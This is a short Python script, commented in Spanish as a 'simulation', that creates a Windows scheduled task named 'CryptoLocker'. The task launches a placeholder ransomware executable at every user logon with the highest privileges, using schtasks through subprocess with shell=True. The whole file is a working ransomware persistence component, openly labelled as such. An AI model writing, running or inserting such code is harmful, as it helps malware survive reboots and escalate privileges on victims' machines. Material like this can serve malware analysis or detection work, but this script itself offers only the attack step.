# task_scheduler.py - Simulación de tarea programada
# Crea tarea para reinicio.

import subprocess

def create_task():
    cmd = 'schtasks /create /tn "CryptoLocker" /tr "C:\\path\\to\\ransomware.exe" /sc onlogon /rl highest'
    subprocess.run(cmd, shell=True)
    print("Tarea programada creada.")

def main():
    create_task()

if __name__ == "__main__":
    main()